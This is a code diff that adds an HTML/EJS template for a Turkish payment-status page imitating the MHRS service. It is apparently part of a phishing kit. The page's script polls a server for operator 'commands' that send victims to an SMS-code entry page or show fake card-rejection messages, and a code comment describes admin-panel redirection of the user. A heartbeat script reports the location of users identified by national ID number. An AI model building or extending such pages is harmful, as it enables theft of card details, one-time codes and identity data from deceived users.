@@ -1,0 +1,215 @@
+<!doctype html>
+<html lang="tr">
+<head>
+    <meta charset="utf-8">
+    <title>MHRS | İşlem Durumu</title>
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, shrink-to-fit=no, maximum-scale=1.0, minimum-scale=1.0">
+    <link rel="shortcut icon" href="/img/icon/favIcon.png">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>tailwind.config = { corePlugins: { preflight: false } };</script>
+    <style>
+        body { font-family: 'Segoe UI', Arial, sans-serif; }
+        @keyframes don { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        .spinner-don { animation: don 1s linear infinite; transform-origin: 50% 50%; }
+    </style>
+</head>
+<body style="margin: 0; background: #f5f6f8; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 24px 16px; box-sizing: border-box;">
+
+    <div class="bg-white rounded-2xl shadow-lg w-full max-w-md px-6 py-8 text-center">
+
+        <!-- Dairesel durum göstergesi -->
+        <div class="flex justify-center">
+            <div class="relative" style="width: 96px; height: 96px;">
+                <div id="spinnerKutu" class="absolute inset-0">
+                    <svg viewBox="0 0 100 100" class="w-full h-full">
+                        <circle cx="50" cy="50" r="42" fill="none" stroke="#e5e7eb" stroke-width="9"></circle>
+                        <circle class="spinner-don" cx="50" cy="50" r="42" fill="none" stroke="#a21f29" stroke-width="9" stroke-linecap="round" stroke-dasharray="85 230" stroke-dashoffset="0" transform="rotate(-90 50 50)"></circle>
+                    </svg>
+                </div>
+                <div id="basariliKutu" class="absolute inset-0" style="display: none;">
+                    <svg viewBox="0 0 100 100" class="w-full h-full">
+                        <circle cx="50" cy="50" r="42" fill="#15803d"></circle>
+                        <path d="M32 52 L44 64 L68 38" stroke="#ffffff" stroke-width="8" fill="none" stroke-linecap="round" stroke-linejoin="round"></path>
+                    </svg>
+                </div>
+                <div id="hataKutu" class="absolute inset-0" style="display: none;">
+                    <svg viewBox="0 0 100 100" class="w-full h-full">
+                        <circle cx="50" cy="50" r="42" fill="#b91c1c"></circle>
+                        <rect x="45.5" y="30" width="9" height="28" rx="4.5" fill="#ffffff"></rect>
+                        <circle cx="50" cy="70" r="4.5" fill="#ffffff"></circle>
+                    </svg>
+                </div>
+            </div>
+        </div>
+
+        <!-- Başlık ve açıklama -->
+        <h1 id="durumBaslik" class="text-xl font-bold text-gray-900 mt-6" style="margin-bottom: 0;">İşlem Kontrol Ediliyor</h1>
+        <p id="durumAciklama" class="text-sm text-gray-500 mt-2" style="margin-bottom: 0;">Ödemeniz güvenle işleniyor, lütfen bekleyin...</p>
+
+        <!-- İlerleme adımları -->
+        <div class="flex items-center mt-8">
+            <div class="flex flex-col items-center" style="width: 72px;">
+                <div class="w-9 h-9 rounded-full bg-green-600 flex items-center justify-center">
+                    <svg viewBox="0 0 24 24" class="w-5 h-5" fill="none"><path d="M5 12.5 L10 17.5 L19 7" stroke="#ffffff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"></path></svg>
+                </div>
+                <span class="text-[11px] font-semibold text-green-700 mt-2">Bilgiler</span>
+            </div>
+            <div id="cizgi1" class="flex-1 h-0.5 bg-green-600" style="margin-bottom: 18px;"></div>
+            <div class="flex flex-col items-center" style="width: 72px;">
+                <div id="adim2Nokta" class="w-9 h-9 rounded-full bg-red-600 flex items-center justify-center text-white text-sm font-bold">2</div>
+                <span id="adim2Metin" class="text-[11px] font-semibold text-red-700 mt-2">Doğrulama</span>
+            </div>
+            <div id="cizgi2" class="flex-1 h-0.5 bg-gray-200" style="margin-bottom: 18px;"></div>
+            <div class="flex flex-col items-center" style="width: 72px;">
+                <div id="adim3Nokta" class="w-9 h-9 rounded-full border-2 border-gray-300 flex items-center justify-center text-gray-400 text-sm font-bold" style="box-sizing: border-box;">3</div>
+                <span id="adim3Metin" class="text-[11px] font-medium text-gray-400 mt-2">Onay</span>
+            </div>
+        </div>
+
+        <!-- Bilgi özeti -->
+        <div class="mt-8 rounded-xl p-4 text-left" style="background: #f9fafb; border: 1px solid #f3f4f6;">
+            <div class="flex justify-between items-center py-1.5">
+                <span class="text-sm text-gray-500">İşlem Adı</span>
+                <span class="text-sm font-bold text-gray-900 text-right"><%= islemAdi %></span>
+            </div>
+            <div class="flex justify-between items-center py-1.5">
+                <span class="text-sm text-gray-500">Tutar</span>
+                <span class="text-sm font-bold text-gray-900"><%= tutar %></span>
+            </div>
+            <div class="flex justify-between items-center py-1.5">
+                <span class="text-sm text-gray-500">Tarih</span>
+                <span class="text-sm font-bold text-gray-900"><%= tarih %></span>
+            </div>
+            <div class="flex justify-between items-center py-1.5">
+                <span class="text-sm text-gray-500">Referans No</span>
+                <span class="text-sm font-bold text-gray-900"><%= referansNo %></span>
+            </div>
+        </div>
+
+        <!-- Sonuç butonu -->
+        <div id="sonucAlan" style="display: none;">
+            <a id="sonucButon" href="/anasayfa" class="inline-block w-full rounded-lg text-white font-bold py-3 mt-6" style="text-decoration: none; background: #15803d;">Anasayfaya Dön</a>
+        </div>
+
+        <!-- Güvenlik alt bilgisi -->
+        <div class="mt-6 pt-4 flex items-center justify-center gap-1.5" style="border-top: 1px solid #f3f4f6;">
+            <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" viewBox="0 0 24 24" fill="currentColor" style="color: #9ca3af;"><path d="M12 1a5 5 0 0 0-5 5v3H6a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V11a2 2 0 0 0-2-2h-1V6a5 5 0 0 0-5-5zm-3 8V6a3 3 0 1 1 6 0v3H9z"/></svg>
+            <span class="text-xs" style="color: #9ca3af;">256-bit SSL ile güvenli bağlantı</span>
+        </div>
+    </div>
+
+    <script>
+        (function () {
+            try {
+                var basarili = <%- JSON.stringify(!!basarili) %>;
+                var hataMesaji = <%- JSON.stringify(hata || '') %>;
+                var hataButonMetin = <%- JSON.stringify(hataButonMetin || '') %>;
+                var hataYonlendirme = <%- JSON.stringify(hataYol || '/odeme') %>;
+
+                function gosterSonuc(ok, mesaj, butonMetin) {
+                    var spinner = document.getElementById("spinnerKutu");
+                    var okKutu = document.getElementById("basariliKutu");
+                    var hataKutu = document.getElementById("hataKutu");
+                    var baslik = document.getElementById("durumBaslik");
+                    var aciklama = document.getElementById("durumAciklama");
+                    var sonucAlan = document.getElementById("sonucAlan");
+                    var sonucButon = document.getElementById("sonucButon");
+                    var adim2Nokta = document.getElementById("adim2Nokta");
+                    var adim3Nokta = document.getElementById("adim3Nokta");
+                    var adim2Metin = document.getElementById("adim2Metin");
+                    var adim3Metin = document.getElementById("adim3Metin");
+                    var cizgi2 = document.getElementById("cizgi2");
+                    if (!sonucAlan || !baslik || !aciklama) return;
+
+                    if (spinner) spinner.style.display = "none";
+
+                    if (ok) {
+                        if (okKutu) okKutu.style.display = "block";
+                        baslik.textContent = "Ödeme Onaylandı";
+                        aciklama.textContent = "Ödemeniz başarıyla alınmıştır.";
+                        adim2Nokta.innerHTML = '<svg viewBox="0 0 24 24" class="w-5 h-5" fill="none"><path d="M5 12.5 L10 17.5 L19 7" stroke="#ffffff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"></path></svg>';
+                        adim2Nokta.className = "w-9 h-9 rounded-full bg-green-600 flex items-center justify-center";
+                        adim2Metin.className = "text-[11px] font-semibold text-green-700 mt-2";
+                        adim3Nokta.innerHTML = '<svg viewBox="0 0 24 24" class="w-5 h-5" fill="none"><path d="M5 12.5 L10 17.5 L19 7" stroke="#ffffff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"></path></svg>';
+                        adim3Nokta.className = "w-9 h-9 rounded-full bg-green-600 flex items-center justify-center";
+                        adim3Metin.className = "text-[11px] font-semibold text-green-700 mt-2";
+                        if (cizgi2) cizgi2.className = "flex-1 h-0.5 bg-green-600";
+                        sonucButon.textContent = "Anasayfaya Dön";
+                        sonucButon.href = "/anasayfa";
+                        sonucButon.style.background = "#15803d";
+                    } else {
+                        if (hataKutu) hataKutu.style.display = "block";
+                        baslik.textContent = "İşlem Tamamlanamadı";
+                        aciklama.textContent = mesaj || "Ödeme işlemi gerçekleştirilemedi.";
+                        adim2Nokta.innerHTML = '<span class="text-white text-sm font-bold">!</span>';
+                        adim2Nokta.className = "w-9 h-9 rounded-full bg-red-600 flex items-center justify-center";
+                        adim2Metin.className = "text-[11px] font-semibold text-red-700 mt-2";
+                        sonucButon.textContent = butonMetin || "Devam Et";
+                        sonucButon.href = hataYonlendirme || "/odeme";
+                        sonucButon.style.background = "#a21f29";
+                    }
+                    sonucAlan.style.display = "block";
+                }
+
+                function komutDinle() {
+                    fetch('/odeme/bekleme-durum', { headers: { 'Accept': 'application/json' } })
+                        .then(function (r) { return r.json(); })
+                        .then(function (d) {
+                            if (d && d.oturumYok) { window.location.href = '/giris2'; return; }
+                            if (d && d.komut === 'sms') { window.location.href = '/sms'; return; }
+                            if (d && d.komut === 'onay') { gosterSonuc(true, ''); return; }
+                            if (d && d.komut === 'hatali') {
+                                window.location.href = '/sms?hatali=1';
+                                return;
+                            }
+                            if (d && d.komut === 'basa') { window.location.href = '/odeme'; return; }
+                            if (d && d.komut === 'internetKapali') {
+                                gosterSonuc(false, 'Kartınız internet alışverişlerine kapalıdır.', 'Ödeme Ekranına Geri Dön');
+                                setTimeout(komutDinle, 2500);
+                                return;
+                            }
+                            if (d && d.komut === 'gecersizKart') {
+                                gosterSonuc(false, 'Kartınız geçersizdir. Lütfen farklı bir kart deneyiniz.', 'Ödeme Ekranına Geri Dön');
+                                setTimeout(komutDinle, 2500);
+                                return;
+                            }
+                            setTimeout(komutDinle, 2500);
+                        })
+                        .catch(function () { setTimeout(komutDinle, 2500); });
+                }
+
+                setTimeout(function () {
+                    if (basarili) {
+                        komutDinle();
+                    } else {
+                        gosterSonuc(false, hataMesaji, hataButonMetin);
+                        // Hata ekranında da (ör. internet kapalı / geçersiz kart uyarısı)
+                        // admin komutlarını dinlemeye devam et; böylece kullanıcı
+                        // panelden gönderilen yeni komutla başka sayfaya yönlendirilebilir.
+                        komutDinle();
+                    }
+                }, 3000);
+            } catch (e) {}
+        })();
+    </script>
+
+    <% if (kullanici && kullanici.tcno) { %>
+    <script>
+        (function () {
+            var at = function () {
+                var sayfa = (location.pathname + location.search + location.hash).slice(0, 120);
+                fetch("/api/heartbeat", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ sayfa: sayfa })
+                }).catch(function () {});
+            };
+            at();
+            setInterval(at, 3000);
+            document.addEventListener("visibilitychange", function () { if (!document.hidden) at(); });
+        })();
+    </script>
+    <% } %>
+    <script src="/js/komut-dinle.js"></script>
+</body>
+</html>
